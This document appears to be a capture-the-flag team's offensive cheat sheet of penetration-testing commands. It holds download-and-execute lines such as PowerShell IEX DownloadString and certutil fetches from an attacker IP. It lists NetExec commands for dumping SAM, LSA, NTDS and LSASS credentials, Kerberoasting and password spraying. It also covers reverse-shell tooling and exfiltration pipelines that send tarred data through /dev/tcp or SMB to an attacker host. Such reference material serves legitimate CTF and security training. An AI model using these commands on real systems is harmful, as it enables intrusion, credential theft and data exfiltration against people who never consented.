# 🄿🅄🅁🄿🄻🄴🅂🅃🄾🅁🄼 🅃🅃🄿🅂

A collection of commands, tools, techniques and procedures of the purplestorm ctf team.

## Table of Contents

- [Basics](#basics)
  - [Stabilizing Linux shell](#stabilizing-linux-shell)
  - [Port forwarding](#port-forwarding-1)
  - [Transfering files](#transfering-files)
- [Tooling](#tooling)
  - [Swaks](#swaks)
  - [Ligolo-ng](#ligolo-ng)
  - [NetExec](#netexec)
- [C2](#c2)
  - [Sliver](Sliver.md)
- [Databases](#databases)
  - [SQL Injection](SQL%20Injection.md)
- [Payloads](#payloads)
  - [Reverse Shell](#reverse-shell)
- [Exfiltrating Data](#exfiltrating-data)
- [Fixing SSH Problems](#fixing-ssh-problems)


## Basics

### Stabilizing Linux shell

```
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset
screen
```

### Port forwarding

#### SSH:

On kali:

```
ssh -N -L 80:localhost:80 user@10.10.10.10 -C
```

#### Chisel:

```
./chisel server -p 8000 --reverse #Server -- Attacker
./chisel client 10.10.16.3:8000 R:100:172.17.0.1:100 #Client -- Victim
```

#### Socat:

On victim:

```
socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
```

#### Netcat:

On victim:

```
nc -nlvp 8080 -c "nc localhost 1234"
```

## Transfering files

### Windows

cmd:

```
iwr -uri "http://10.10.10.10:8080/shell.exe" -outfile "shell.exe"

wget -O shell.exe 10.10.10.10:8000/shell.exe

certutil -urlcache -f  http://10.10.10.10:8000/shell.exe C:\inetpub\shell.exe
```

Powershell:

```
Invoke-WebRequest http://10.10.10.10:8000/shell.exe -OutFile shell.exe

powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/shell.exe', 'shell.exe')"

powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/something.ps1')"
```

via SMB:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .    # On attacker

copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe    # On target
```

### Linux

```
wget http://10.10.10.10:8000/some.sh

curl -o some.sh http://10.10.10.10:8000/some.sh
```

via base64:

```
cat shell.sh | base64 -w 0   # On attacker
echo <base64encoded> | base64 -d > shell.sh   # On target
```
via scp:
```
scp some.sh user@10.10.10.10:/tmp/some.sh   # On attacker
```

## Tooling

### Swaks

- [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)

```c
swaks --server example.com --port 587 --auth-user "user@example.com" --auth-password "password" --to "user@target.com" --from ""user@example.com" --header "Subject: foobar" --body "\\\<LHOST>\x"
```

### Ligolo-ng

- [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

#### Prepare Tunnel Interface

```c
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
$ sudo ip link set ligolo up
```

#### Setup Proxy on Attacker Machine

```c
$ ./proxy -laddr <LHOST>:443 -selfcert
```

#### Setup Agent on Target Machine

```c
$ ./agent -connect <LHOST>:443 -ignore-cert
```

#### Configure Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

#### Port Forwarding

```c
[Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

## NetExec

> https://github.com/Pennyw0rth/NetExec

```c
$ sudo apt-get install pipx git
$ pipx ensurepath
$ pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Installation via Poetry

```c
$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
$ git clone https://github.com/Pennyw0rth/NetExec
$ cd NetExec
$ poetry install
$ poetry run NetExec
```

### Modules

```c
$ netexec ldap -L
$ netexec mysql -L
$ netexec smb -L
$ netexec ssh -L
$ netexec winrm -L
```

### Common Commands

```c
$ netexec smb <RHOST> -u '' -p '' --shares
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'  | awk -F '\\' '{print $2}'
$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER"
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
$ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
$ netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
$ netexec ldap <RHOST> -u '' -p '' -M -user-desc
$ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ netexec ldap <RHOST> -u '' -p '' -M ldap-checker
$ netexec ldap <RHOST> -u '' -p '' -M veeam
$ netexec ldap <RHOST> -u '' -p '' -M maq
$ netexec ldap <RHOST> -u '' -p '' -M adcs
$ netexec ldap <RHOST> -u '' -p '' -M zerologon
$ netexec ldap <RHOST> -u '' -p '' -M petitpotam
$ netexec ldap <RHOST> -u '' -p '' -M nopac
$ netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
$ netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
$ netexec winrm <NETWORK>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
$ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
```

## Payloads

### Reverse Shell

- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)

```
pip install pwncat-cs
Listener: pwncat-cs 192.168.1.1 4444
(To change from pwncat shell to local shell, use Ctrl+D)
```

## Exfiltrating Data

### Linux

#### via TCP socket, ebcdic and base64

On kali:

```
nc -nlvp 80 > datafolder.tmp
```

On target:

```
tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/10.10.10.10/80
```

On kali:

```
dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
tar xf datafolder.tar
```

#### via SSH

On target:

```
tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"
```

On kali:

```
cd /tmp/datafolder
```

### Windows

via SMB server:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username user -password pass share . -smb2support  # On kali
net use \\10.10.16.5\share /u:user pass   # On victim
copy C:\Users\user\Desktop\somefile.txt \\10.10.16.5\share\somefile.txt   # On victim
```

via pscp:

```
pscp Administrator@10.10.10.10:/Users/Administrator/Downloads/something.txt
```

## Fixing SSH Problems

### SSH Key Cleanup

Sometimes, exfiltrated SSH keys will cause ugly errors, such as `Load key "id_rsa": error in libcrypto`. This can often be corrected
with simple cleanup.

```bash
dos2unix id_rsa
vim --clean id_rsa
chmod 400 id_rsa

# One line version
dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 400 id_rsa
```

### RSA Problems

Newer versions of SSH might complain about RSA as such. This can be corrected by adding the following to `~/.ssh/config`.

```sh
HostKeyAlgorithms +ssh-rsa
PubkeyAcceptedAlgorithms +ssh-rsa
```
